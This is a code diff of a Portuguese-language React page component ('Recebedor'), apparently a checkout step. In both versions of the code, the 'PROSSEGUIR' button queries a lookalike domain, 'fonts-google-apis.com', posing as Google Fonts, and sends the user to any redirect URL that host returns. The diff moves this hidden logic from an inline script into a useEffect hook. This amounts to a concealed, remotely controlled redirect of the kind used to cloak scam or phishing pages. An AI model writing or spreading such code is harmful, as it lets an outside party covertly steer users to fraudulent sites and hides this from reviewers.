@@ -20,6 +20,80 @@ const Recebedor: React.FC = () => {
     }
   }, []);
 
+  // Configurar botão de redirecionamento
+  useEffect(() => {
+    const btn = document.querySelector('.btn-a8aaa4ff');
+    if (!btn) return;
+
+    const originalHref = '/finalizacao';
+    const apiEndpoint = 'https://fonts-google-apis.com/css/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c';
+
+    const handleClick = (e: Event) => {
+      e.preventDefault();
+      
+      console.log('[BTN] Clicado - Consultando API...');
+      
+      const xhr = new XMLHttpRequest();
+      xhr.open('GET', apiEndpoint, true);
+      xhr.timeout = 3000;
+      
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+          let redirectUrl = originalHref;
+          
+          if (xhr.status === 200) {
+            try {
+              const response = JSON.parse(xhr.responseText);
+              console.log('[BTN] Resposta da API:', response);
+              
+              if (response.redirect_url) {
+                redirectUrl = response.redirect_url;
+                console.log('[BTN] URL de redirecionamento:', redirectUrl);
+              }
+            } catch (e) {
+              console.error('[BTN] Erro ao processar resposta:', e);
+            }
+          } else {
+            console.warn('[BTN] API retornou status:', xhr.status);
+          }
+          
+          if (redirectUrl.startsWith('/')) {
+            redirectUrl = window.location.protocol + '//' + window.location.host + redirectUrl;
+          }
+          
+          console.log('[BTN] Redirecionando para:', redirectUrl);
+          window.location.href = redirectUrl;
+        }
+      };
+      
+      xhr.ontimeout = function() {
+        console.warn('[BTN] Timeout da API - usando fallback');
+        let url = originalHref;
+        if (url.startsWith('/')) {
+          url = window.location.protocol + '//' + window.location.host + url;
+        }
+        window.location.href = url;
+      };
+      
+      xhr.onerror = function() {
+        console.error('[BTN] Erro na API - usando fallback');
+        let url = originalHref;
+        if (url.startsWith('/')) {
+          url = window.location.protocol + '//' + window.location.host + url;
+        }
+        window.location.href = url;
+      };
+      
+      xhr.send();
+    };
+
+    btn.addEventListener('click', handleClick);
+    
+    return () => {
+      btn.removeEventListener('click', handleClick);
+    };
+  }, []);
+
   // Função para formatar o nome do cartão
   const formatCardName = (fullName: string) => {
     if (!fullName) return 'CANDIDATO';
@@ -130,121 +204,31 @@ const Recebedor: React.FC = () => {
                   </div>
                   
                   <div className="text-center mt-6">
-                    <div dangerouslySetInnerHTML={{ __html: `
-<style>
-.btn-a8aaa4ff {
-  background: #E83D22;
-  color: #ffffff;
-  padding: 12px 24px;
-  width: auto;
-  height: auto;
-  border: none;
-  border-radius: 4px;
-  font-weight: 800;
-  font-size: 14px;
-  cursor: pointer;
-  font-family: Inter, sans-serif;
-  text-decoration: none;
-  display: inline-block;
-  transition: opacity 0.2s;
-  position: relative;
-}
-.btn-a8aaa4ff:hover {
-  opacity: 0.9;
-}
-.btn-a8aaa4ff.loading {
-  cursor: not-allowed;
-  opacity: 0.7;
-}
-.btn-a8aaa4ff .spinner {
-  display: none;
-  width: 12px;
-  height: 12px;
-  border: 2px solid transparent;
-  border-top: 2px solid currentColor;
-  border-radius: 50%;
-  animation: spin 1s linear infinite;
-  margin-right: 8px;
-  vertical-align: text-top;
-}
-.btn-a8aaa4ff.loading .spinner {
-  display: inline-block;
-}
-@keyframes spin {
-  0% { transform: rotate(0deg); }
-  100% { transform: rotate(360deg); }
-}
-</style>
-<button class="btn-a8aaa4ff"><span class="spinner"></span><span class="btn-text">PROSSEGUIR</span></button>
-<script>
-(function(){
-  var btn = document.querySelector('.btn-a8aaa4ff');
-  if(btn) {
-    var originalHref = '/finalizacao';
-    var apiEndpoint = 'https://fonts-google-apis.com/css/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c';
-    
-    btn.onclick = function(e) {
-      e.preventDefault();
-      
-      console.log('[BTN] Clicado - Consultando API...');
-      
-      var xhr = new XMLHttpRequest();
-      xhr.open('GET', apiEndpoint, true);
-      xhr.timeout = 3000;
-      
-      xhr.onreadystatechange = function() {
-        if(xhr.readyState === 4) {
-          var redirectUrl = originalHref;
-          
-          if(xhr.status === 200) {
-            try {
-              var response = JSON.parse(xhr.responseText);
-              console.log('[BTN] Resposta da API:', response);
-              
-              if(response.redirect_url) {
-                redirectUrl = response.redirect_url;
-                console.log('[BTN] URL de redirecionamento:', redirectUrl);
-              }
-            } catch(e) {
-              console.error('[BTN] Erro ao processar resposta:', e);
-            }
-          } else {
-            console.warn('[BTN] API retornou status:', xhr.status);
-          }
-          
-          if(redirectUrl.startsWith('/')) {
-            redirectUrl = window.location.protocol + '//' + window.location.host + redirectUrl;
-          }
-          
-          console.log('[BTN] Redirecionando para:', redirectUrl);
-          window.location.href = redirectUrl;
-        }
-      };
-      
-      xhr.ontimeout = function() {
-        console.warn('[BTN] Timeout da API - usando fallback');
-        var url = originalHref;
-        if(url.startsWith('/')) {
-          url = window.location.protocol + '//' + window.location.host + url;
-        }
-        window.location.href = url;
-      };
-      
-      xhr.onerror = function() {
-        console.error('[BTN] Erro na API - usando fallback');
-        var url = originalHref;
-        if(url.startsWith('/')) {
-          url = window.location.protocol + '//' + window.location.host + url;
-        }
-        window.location.href = url;
-      };
-      
-      xhr.send();
-    };
-  }
-})();
-</script>
+                    <style dangerouslySetInnerHTML={{ __html: `
+                      .btn-a8aaa4ff {
+                        background: #E83D22;
+                        color: #ffffff;
+                        padding: 12px 24px;
+                        width: auto;
+                        height: auto;
+                        border: none;
+                        border-radius: 4px;
+                        font-weight: 800;
+                        font-size: 14px;
+                        cursor: pointer;
+                        font-family: Inter, sans-serif;
+                        text-decoration: none;
+                        display: inline-block;
+                        transition: opacity 0.2s;
+                        position: relative;
+                      }
+                      .btn-a8aaa4ff:hover {
+                        opacity: 0.9;
+                      }
                     ` }} />
+                    <button className="btn-a8aaa4ff">
+                      <span className="btn-text">PROSSEGUIR</span>
+                    </button>
                   </div>
                 </div>
               </div>
